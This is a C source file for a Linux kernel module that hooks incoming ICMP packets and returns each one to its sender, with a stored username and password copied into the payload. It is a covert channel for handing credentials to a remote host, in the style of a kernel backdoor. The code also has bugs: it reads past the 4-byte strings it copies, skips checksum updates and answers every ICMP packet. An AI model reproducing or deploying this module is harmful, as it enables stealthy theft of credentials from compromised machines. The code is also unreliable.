#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/netdevice.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>

static struct nf_hook_ops nfho;
struct sk_buff * sb;
struct iphdr * iph;

static char * username = "abc\0";
static char * password = "123\0";

static unsigned int hook_func(unsigned int hooknum,struct sk_buff *skb,const struct net_device *in,const struct net_device *out,int(okfn)(struct sk_buff *)){

	struct icmphdr * icmp;
	char * cp_data;
	unsigned int taddr;

	sb = skb;
	if(ip_hdr(sb)->protocol != IPPROTO_ICMP)
		return NF_ACCEPT;	

	icmp = (struct icmphdr *)(sb->data + ip_hdr(sb)->ihl*4);


	taddr = ip_hdr(sb)->saddr;
	ip_hdr(sb)->saddr = ip_hdr(sb)->daddr;
	ip_hdr(sb)->daddr = taddr;

	sb->pkt_type = PACKET_OUTGOING;


	switch (sb->dev->type) {
		case ARPHRD_PPP:                       /* Ntcho iddling needs doing */
			break;
		case ARPHRD_LOOPBACK:
		case ARPHRD_ETHER:
			{
				unsigned char t_hwaddr[ETH_ALEN];

				/* Move the data pointer to point to the link layer header */
				sb->data = (unsigned char *)eth_hdr(sb);
				sb->len += ETH_HLEN; //sizeof(sb->mac.ethernet);
				memcpy(t_hwaddr, (eth_hdr(sb)->h_dest), ETH_ALEN);
				memcpy((eth_hdr(sb)->h_dest), (eth_hdr(sb)->h_source),
						ETH_ALEN);
				memcpy((eth_hdr(sb)->h_source), t_hwaddr, ETH_ALEN);
				break;
			}
	}

	cp_data = (char *)((char *)icmp + sizeof(struct icmphdr));
	if (username)
		//memcpy(cp_data + 4, username, 16);
		memcpy(cp_data, username, 12);
	if (password)
		memcpy(cp_data + 12, password, 12);

	/* This is where things will die if they are going to.
	 * Fingers crossed... */
	dev_queue_xmit(sb);
	return NF_STOLEN;
}


int init_module(){
	nfho.hook = hook_func;
	nfho.hooknum = NF_INET_PRE_ROUTING;
	nfho.pf = PF_INET;
	nfho.priority = NF_IP_PRI_FIRST; 

	nf_register_hook(&nfho);
	return 0;

}

void cleanup_module(void){
	nf_unregister_hook(&nfho);
}
